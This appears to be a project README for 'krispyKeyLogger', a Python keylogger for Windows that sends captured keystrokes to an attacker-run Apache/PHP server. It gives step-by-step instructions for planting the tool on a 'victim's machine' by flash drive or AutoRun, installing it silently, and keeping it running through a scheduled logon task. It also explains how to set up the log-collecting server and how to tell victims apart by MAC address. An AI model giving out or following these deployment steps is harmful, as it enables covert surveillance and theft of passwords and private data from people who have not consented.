# krispyKeyLogger
windows-amd64 based key logger written in python3 with pushing logs to remote server.

Requirements
1) Python-3.7.0-amd64.exe
2) pyHook-1.5.1-cp37-cp37m-win64.whl
3) pywin32-223.1-cp37-cp37m-win64.whl
4) Internet connection on victim's machine (for uploading logs)-optional
5) A web host running apache2 on the internet (to download logs from victim's machine).


# Steps to setup krispyKeyLogger on victim's machine
1) Download this repo and also download python-3.7.0-amd64.exe from https://www.python.org/downloads/ and save it to victim directory
2) You can carry victim directory in a removeable flash drive or download from web directly.
3) Change remote server path where you want to upload logs in init2z.pyw script on line 22(optinal if you want logs to be upload).You can also change the path where the python script 'init2z.pyw' will be stored in 'deploy.bat' script line ,then you need to also change location of 'init2z.pyw' python script on task schedule command in 'hiddencmd.bat' line 27.Default path for 'init2z.pyw' is 'C:\Users\%USERNAME%\AppData\Local\init2z.pyw' line 8 and line 10, where admin write permission is not required.
4) Execute hiddencmd.bat either by AutoRun or manually.
  You will be requied to give administrative privileges to make a windows task schedule to execute krispyKeyLogger at logon,if privileges are not given the task will not be created however the 'init2z.pyw' can be manually executed.
5) The 'deploy.bat' file will install python and two other python packages present in this directory.
6) 'deploy.bat' will also create an instance of krispyKeyLogger for current user login session.

# Steps to setup krispyKeyLogger on server - remote access logs (optional)
1) Download server side directory to an apache2 server. Make sure that you can execute the php from a domain or ip address
  eg. http://example.com/upload.php or http://127.0.0.1/upload.php
2) Change "Krispy_logs" directory location or create a directory anywhere you want.just make sure you have write permission on that directory.Default location is "/home/user/Krispy_logs/" where 'user' is the username for current user.Change it accordingly on debian based system or enter a completely new location.


# known bugs and other hints
1) Reinstalls python on default directory.untested on different environments having custom installation of python.Tested on fresh install of windows.
2) logs and init2z.pyw are saved in plain text.
3) logs are sent over the internet in plain text without SSL.
4) sometimes windows task scheduler do not starts the task on logon
5) onstart task option does not work for some reason, onlogon works fine in task scheduler file 'hiddencmd.bat' line 27.
6) init2z.pyw saves the logs with a universally unique decimal number (decimal equivalent of primary mac address of the device) at the start of log file so that the server does not overwrite or reject to download logs of different victims at same day

![Alt text](krispyKeyLogger/Screenshot from 2018-07-06 15-14-09.png?raw=true "Optional Title")
